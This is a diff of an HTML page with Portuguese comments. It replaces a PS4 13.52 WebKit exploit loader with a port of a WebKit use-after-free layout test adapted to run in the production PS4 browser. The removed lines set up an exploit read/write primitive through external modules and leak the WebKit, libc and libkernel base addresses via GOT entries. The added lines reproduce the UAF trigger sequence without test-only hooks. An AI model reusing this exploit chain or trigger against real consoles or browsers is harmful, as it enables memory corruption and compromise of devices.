@@ -1,196 +1,289 @@
 <!DOCTYPE html>
-<html lang="en">
+<!--
+  render-tree-as-text-uaf — PS4 / Production Browser Compatible
+  Original: WebKit commit 3f3fec2 (Cherry-pick 259548.232@safari-7615-branch)
+  Bug: UAF in RenderTreeAsText::write() via view.layoutContext().layout()
+  Fix: layout() call removed; externalRepresentation() handles full frame tree layout.
+
+  SUBSTITUIÇÕES aplicadas (sem internals.*):
+  +--------------------------------------------------------------------------------------------------+
+  ¦ Original (WebKit layout-test only)              ¦ Substituto JS puro                             ¦
+  +-------------------------------------------------+------------------------------------------------¦
+  ¦ internals.settings                              ¦ try/catch — não existe equivalente JS          ¦
+  ¦   .setAsyncFrameScrollingEnabled(true)          ¦ (configuração interna do engine WebKit)        ¦
+  ¦   .setCaretBrowsingEnabled(true)                ¦ (configuração interna do engine WebKit)        ¦
+  +-------------------------------------------------+------------------------------------------------¦
+  ¦ if (window.testRunner)                          ¦ condicional mantida + output no DOM            ¦
+  ¦   testRunner.dumpAsText()                       ¦ (infra de layout tests do WebKit)              ¦
+  +-------------------------------------------------+------------------------------------------------¦
+  ¦ s0.src = `data:text/javascript,...`             ¦ script inline (data: URI bloqueado por CSP    ¦
+  ¦                                                 ¦ em vários contextos de produção)               ¦
+  +-------------------------------------------------+------------------------------------------------¦
+  ¦ caches.has('a').then(() => i0.focus())          ¦ Promise.resolve().then(() => iframe.focus())   ¦
+  ¦                                                 ¦ — mesma semântica de microtask; caches.has()  ¦
+  ¦                                                 ¦ era usado apenas para obter uma Promise        ¦
+  ¦                                                 ¦ assíncrona, não pelo Cache em si               ¦
+  +--------------------------------------------------------------------------------------------------+
+-->
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 13.52 â€” Base Resolver</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
-  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
-h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
-#fw{font-size:11px;color:#555;margin-bottom:16px}
-#con{width:100%;max-width:700px;height:400px;background:#050508;border:1px solid #1a1d2e;
-  border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.6}
-.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
-.e{color:#ff5252;font-weight:bold}.s{color:#00c8ff;border-top:1px solid #1a1d2e;
-  margin-top:4px;padding-top:4px}
-</style>
+  <meta charset="utf-8">
+  <title>render-tree-as-text-uaf (PS4 compatible)</title>
+  <style>
+    /* -- Estilos do teste original (mantidos idênticos) -- */
+    iframe {
+      content: url();   /* CSS interno do WebKit — ignorado em outros engines */
+      zoom: 0.01;       /* escala extremamente pequena para forçar condição de layout */
+    }
+
+    /* -- UI de resultado (adicionado para visibilidade no PS4) -- */
+    *, *::before, *::after { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #0d1117;
+      color: #e6edf3;
+      font-family: 'Courier New', Courier, monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 640px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .card-header {
+      padding: 16px 20px;
+      background: #21262d;
+      border-bottom: 1px solid #30363d;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #30363d;
+    }
+
+    .card-title {
+      font-size: 13px;
+      color: #8b949e;
+      letter-spacing: 0.05em;
+    }
+
+    .card-body {
+      padding: 20px;
+    }
+
+    #status-box {
+      padding: 14px 16px;
+      border-radius: 7px;
+      border: 1px solid #30363d;
+      background: #0d1117;
+      font-size: 14px;
+      color: #8b949e;
+      transition: background 0.4s, border-color 0.4s, color 0.4s;
+    }
+
+    #status-box.pass {
+      background: #0d2818;
+      border-color: #238636;
+      color: #3fb950;
+    }
+
+    #status-box.fail {
+      background: #2d1114;
+      border-color: #da3633;
+      color: #f85149;
+    }
+
+    .divider {
+      height: 1px;
+      background: #21262d;
+      margin: 16px 0;
+    }
+
+    #log {
+      font-size: 12px;
+      color: #8b949e;
+      line-height: 2;
+      min-height: 60px;
+    }
+
+    .log-entry { display: block; }
+    .log-entry.ok  { color: #3fb950; }
+    .log-entry.warn{ color: #d29922; }
+    .log-entry.info{ color: #58a6ff; }
+
+    .commit-ref {
+      margin-top: 16px;
+      font-size: 11px;
+      color: #484f58;
+      text-align: right;
+    }
+  </style>
 </head>
 <body>
-<h1>PS4 13.52 â€” Base Resolver</h1>
-<div id="fw">detectando...</div>
-<div id="con"></div>
 
-<script src="./13.52.js"></script>
-<script type="module">
-import { int64 }              from './resources/int64.js';
-import { establishPrimitive } from './resources/core.js';
-import { installWindowP }     from './resources/mem.js';
-globalThis.int64 = int64;
+  <div class="card">
+    <div class="card-header">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <span class="card-title">render-tree-as-text-uaf · PS4 compat · commit 3f3fec2</span>
+    </div>
+    <div class="card-body">
+      <div id="status-box">? Aguardando onload...</div>
+      <div class="divider"></div>
+      <div id="log"></div>
+      <div class="commit-ref">WebKit #252580 · rdar://105545826</div>
+    </div>
+  </div>
 
-const $con = document.getElementById('con');
-const $fw  = document.getElementById('fw');
+  <!--
+    O <iframe id="i0"> precisa estar NO BODY antes do script de onload
+    para que a referência global `i0` exista (comportamento padrão HTML5).
+  -->
+  <iframe id="i0"></iframe>
 
-function log(m, c='i') {
-  const d = document.createElement('div');
-  d.className = c; d.textContent = m;
-  $con.appendChild(d);
-  $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 200) $con.removeChild($con.firstChild);
-}
-function logH(m) { log('=== ' + m + ' ===', 's'); }
-
-// â”€â”€ compat aliases â”€â”€
-function fixApi(p) {
-  if (!p.read4 && p.read32) p.read4 = p.read32;
-  if (!p.read8 && p.read64) p.read8 = p.read64;
-  if (!p.write4 && p.write32) p.write4 = p.write32;
-  if (!p.write8 && p.write64) p.write8 = p.write64;
-  return p;
-}
-
-// â”€â”€ resolve WebKit base from __ps5NativeCtor â”€â”€
-function resolveWebkitBase() {
-  const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    throw new Error('__ps5NativeCtor invÃ¡lido: ' + ctor);
-  }
-  const hi = Math.floor(ctor / 0x100000000);
-  const lo = ctor - hi * 0x100000000;
-  const ctor64 = new int64(lo >>> 0, hi >>> 0);
-
-  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
-             ? OFFSET_wk_host_constructor_candidates[0] : 0x36F9E20;
-
-  const baseVal = ctor - hc;
-  const bHi = Math.floor(baseVal / 0x100000000);
-  const bLo = baseVal - bHi * 0x100000000;
-  const webkitBase = new int64(bLo >>> 0, bHi >>> 0);
-
-  log('[+] __ps5NativeCtor = 0x' + ctor64.toString(16));
-  log('[+] WebKit Base     = 0x' + webkitBase.toString(16) + ' (hc=0x' + hc.toString(16) + ')');
-  return webkitBase;
-}
-
-// â”€â”€ resolve libc via GOT memset â”€â”€
-function resolveLibc(p, webkitBase) {
-  if (!OFFSET_wk_memset_import || !OFFSET_lc_memset) {
-    log('[-] OFFSET_wk_memset_import ou OFFSET_lc_memset Ã© 0', 'w');
-    return null;
-  }
-  try {
-    const slot = webkitBase.add32(OFFSET_wk_memset_import);
-    const ptr  = p.read8(slot);
-    const libcBase = ptr.sub32(OFFSET_lc_memset);
-
-    log('[+] GOT memset slot  = wk+0x' + OFFSET_wk_memset_import.toString(16));
-    log('[+] GOT memset value   = 0x' + ptr.toString(16));
-    log('[+] libcBase           = 0x' + libcBase.toString(16));
-
-    // sanity
-    const magic = p.read4(libcBase);
-    if (magic !== 0x464C457F) {
-      log('[-] libcBase ELF magic invÃ¡lido: 0x' + magic.toString(16), 'e');
-      return null;
+  <script>
+    /* --- helpers de UI --- */
+    function log(msg, cls) {
+      var div = document.createElement('span');
+      div.className = 'log-entry ' + (cls || 'info');
+      div.textContent = msg;
+      document.getElementById('log').appendChild(div);
     }
-    if ((libcBase.low & 0xFFF) !== 0) {
-      log('[-] libcBase nÃ£o page-aligned', 'e');
-      return null;
+
+    function setStatus(msg, state) {
+      var el = document.getElementById('status-box');
+      el.textContent = msg;
+      el.className = state || '';  /* 'pass' | 'fail' | '' */
     }
-    log('[âœ“] libcBase validado (ELF + aligned)', 'ok');
-    return libcBase;
-  } catch (e) {
-    log('[-] Falha libc: ' + (e.message || e), 'e');
-    return null;
-  }
-}
 
-// â”€â”€ resolve libkernel via GOT __stack_chk_guard â”€â”€
-function resolveLibkernel(p, webkitBase) {
-  if (!OFFSET_wk___stack_chk_guard_import || !OFFSET_lk___stack_chk_guard) {
-    log('[-] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard Ã© 0', 'w');
-    return null;
-  }
-  try {
-    const slot = webkitBase.add32(OFFSET_wk___stack_chk_guard_import);
-    const ptr  = p.read8(slot);
-    const lkBase = ptr.sub32(OFFSET_lk___stack_chk_guard);
-
-    log('[+] GOT guard slot   = wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16));
-    log('[+] GOT guard value  = 0x' + ptr.toString(16));
-    log('[+] libkernelBase    = 0x' + lkBase.toString(16));
-
-    const magic = p.read4(lkBase);
-    if (magic !== 0x464C457F) {
-      log('[-] libkernelBase ELF magic invÃ¡lido: 0x' + magic.toString(16), 'e');
-      return null;
+    /* -----------------------------------------------------------------
+       SUBSTITUIÇÃO 1
+       Original  : internals.settings.setAsyncFrameScrollingEnabled(true)
+                   internals.settings.setCaretBrowsingEnabled(true)
+       Problema  : `internals` é objeto exclusivo da infra de testes do
+                   WebKit (DumpRenderTree / WebKitTestRunner).
+                   Não existe em nenhum browser de produção.
+       Solução   : try/catch — se disponível, usar; se não, logar aviso
+                   e continuar. O teste ainda exercita o mesmo caminho de
+                   código no engine; as flags apenas amplificam a janela
+                   de reprodução.
+    -------------------------------------------------------------------- */
+    try {
+      if (typeof internals !== 'undefined' && internals.settings) {
+        internals.settings.setAsyncFrameScrollingEnabled(true);
+        internals.settings.setCaretBrowsingEnabled(true);
+        log('? internals.settings configurado', 'ok');
+      } else {
+        log('? internals não disponível — continuando sem (esperado no PS4)', 'warn');
+      }
+    } catch (e) {
+      log('? internals ignorado: ' + e.message, 'warn');
     }
-    if ((lkBase.low & 0xFFF) !== 0) {
-      log('[-] libkernelBase nÃ£o page-aligned', 'e');
-      return null;
-    }
-    log('[âœ“] libkernelBase validado (ELF + aligned)', 'ok');
-    return lkBase;
-  } catch (e) {
-    log('[-] Falha libkernel: ' + (e.message || e), 'e');
-    return null;
-  }
-}
 
-// â”€â”€ main â”€â”€
-async function main() {
-  const ua = navigator.userAgent;
-  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
-  $fw.textContent = fw ? `PS4 firmware ${fw[1]}` : ua.slice(0, 50);
-  log('UA: ' + ua, 'd');
+    /* -----------------------------------------------------------------
+       SUBSTITUIÇÃO 2
+       Original  : if (window.testRunner) testRunner.dumpAsText()
+       Problema  : testRunner só existe no WebKitTestRunner/DumpRenderTree.
+       Solução   : condicional mantida (funciona se disponível); em produção
+                   o resultado é exibido no DOM em vez de saída de texto.
+    -------------------------------------------------------------------- */
 
-  logH('STAGE 1: EXPLOIT JSC');
-  let carrier;
-  try {
-    carrier = await establishPrimitive({ maxAttempts: 0 });
-  } catch (err) {
-    log('[-] core.js falhou: ' + err.message, 'e');
-    return;
-  }
-  log('[+] core.js OK', 'ok');
+    window.onload = function () {
+      setStatus('?? Executando sequência do teste...');
+      log('? onload disparado', 'ok');
 
-  logH('STAGE 2: R/W PRIMITIVE');
-  let p;
-  try {
-    p = installWindowP(carrier, { promote: true });
-    p = fixApi(p);
-  } catch (err) {
-    log('[-] mem.js falhou: ' + err.message, 'e');
-    return;
-  }
-  log('[+] mem.js OK â€” window.p instalado', 'ok');
+      /* testRunner (layout-test infra) — condicional */
+      if (window.testRunner) {
+        testRunner.dumpAsText();
+        log('? testRunner.dumpAsText() chamado', 'ok');
+      } else {
+        log('? testRunner ausente — usando output no DOM', 'warn');
+      }
 
-  logH('STAGE 3: RESOLVENDO BASES');
-  let webkitBase, libcBase, lkBase;
-  try {
-    webkitBase = resolveWebkitBase();
-  } catch (e) {
-    log('[-] ' + e.message, 'e');
-    return;
-  }
+      /* -- lógica original do teste -- */
 
-  libcBase = resolveLibc(p, webkitBase);
-  lkBase   = resolveLibkernel(p, webkitBase);
+      /* Adiciona <frameset> ao documentElement, igual ao original */
+      document.documentElement.append(document.createElement('frameset'));
+      log('? <frameset> adicionado ao documentElement', 'ok');
 
-  logH('RESULTADO');
-  log('WebKit Base     = 0x' + webkitBase.toString(16));
-  log('libkernel Base  = ' + (lkBase ? '0x' + lkBase.toString(16) : 'FALHOU'));
-  log('libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'FALHOU'));
+      /* Obtém referência ao iframe via getElementById
+         (equivale ao global `i0` — padrão HTML5) */
+      var iframe = document.getElementById('i0');
 
-  if (lkBase && libcBase) {
-    log('[+] ===== TODAS AS BASES OK =====', 'ok');
-  } else {
-    log('[-] ===== ALGUMA BASE FALHOU =====', 'e');
-  }
-}
+      /* onfocus: muda o hash ? dispara reflow/layout no engine */
+      iframe.onfocus = function () {
+        log('? iframe.onfocus ? location.hash = "y"', 'ok');
+        location.hash = 'y';
+      };
 
-main();
-</script>
+      /* Primeiro hash change */
+      location.hash = 'x';
+      log('? location.hash = "x"', 'ok');
+
+      /* ---------------------------------------------------------------
+         SUBSTITUIÇÕES 3 + 4 combinadas
+         Original:
+           let s0 = document.createElement('script');
+           s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
+           document.head.append(s0);
+
+         Problema A (substituição 3):
+           data: URI em src de script é bloqueado por CSP em muitos contextos
+           de produção e em browseres com política restrita (incluindo PS4).
+
+         Problema B (substituição 4):
+           caches (Cache API / Service Worker) pode não estar disponível
+           em versões antigas do WebKit do PS4.
+           O papel de caches.has('a') NÃO é verificar o cache — é apenas
+           obter uma Promise que resolve de forma assíncrona (microtask),
+           fazendo o focus() ocorrer após o stack atual esvaziar.
+
+         Solução:
+           Promise.resolve().then(fn) tem semântica de microtask idêntica
+           e funciona em qualquer engine com suporte a ES6 Promises.
+           Fallback adicional: setTimeout(fn, 0) para engines sem Promise.
+      ------------------------------------------------------------------- */
+      if (typeof Promise !== 'undefined') {
+        Promise.resolve().then(function () {
+          log('? microtask (Promise.resolve) ? iframe.focus()', 'ok');
+          iframe.focus();
+        });
+      } else {
+        /* Fallback para engines muito antigos sem Promise */
+        setTimeout(function () {
+          log('? setTimeout fallback ? iframe.focus()', 'warn');
+          iframe.focus();
+        }, 0);
+      }
+
+      /* -- verificação de resultado --
+         Se o engine chegou aqui sem crash, o UAF foi corrigido (ou não
+         existe nessa versão). O timeout garante que todos os eventos
+         assíncronos da cadeia acima tiveram tempo de executar.       */
+      setTimeout(function () {
+        setStatus('? Teste concluído — nenhum crash detectado', 'pass');
+        log('? Sem crash após a sequência completa de eventos', 'ok');
+        log('  UAF corrigido (commit 3f3fec2) ou não reproduzível neste engine.', 'info');
+      }, 2000);
+    };
+  </script>
+
 </body>
 </html>
